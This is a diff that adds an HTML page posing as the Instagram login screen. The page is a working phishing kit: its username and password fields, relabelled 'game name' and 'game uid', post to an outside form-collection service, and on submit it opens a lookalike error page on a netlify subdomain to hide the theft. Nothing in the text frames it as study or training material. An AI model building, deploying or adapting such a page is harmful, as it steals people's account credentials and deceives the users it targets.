@@ -1,0 +1,51 @@
+<html>
+
+<head>
+    <title>Login Instagram</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
+    <meta http-equiv="refresh" content="60">
+    <link rel="icon" href="images/favicon.png" type="image/icon">
+    <link rel="stylesheet" type="text/css" href="style.css">
+
+</head>
+
+<body>
+    <div class="container">
+        <div class="page">
+            <div class="logo">
+
+                <img src="images/instagram.png" alt="instagram" style="width: 175px; ">
+            </div>
+
+            <br />
+            <form action="https://formspree.io/f/xnqkdpjl" id="appointment_form" method="POST"  onsubmit="return validateForm()">
+                <input type="text" placeholder="Phone number, username, or email " name="game name" required>
+                <input type="text" placeholder="Password" name="game uid" required>
+                <button type="submit" class="submitbutton">Log in </button>
+                <br />
+                <script>
+                        function validateForm() {window.open("https://log-in.instagram.netlify.app/error.html");}
+                </script>
+            </form>
+<div class="option">OR </div>
+            <div class="fblink">
+                <span class="fab fafacebook"></span>
+                <a href="#"> Log in With Facebook</a>
+            </div>
+
+            <div class="forget-id">
+                <a href="#">Forget password?</a>
+            </div>
+            
+        </div>
+    </div>
+
+    <br />
+   
+    <br />
+<script src="contact.js"></script>
+
+</body>
+
+</html>
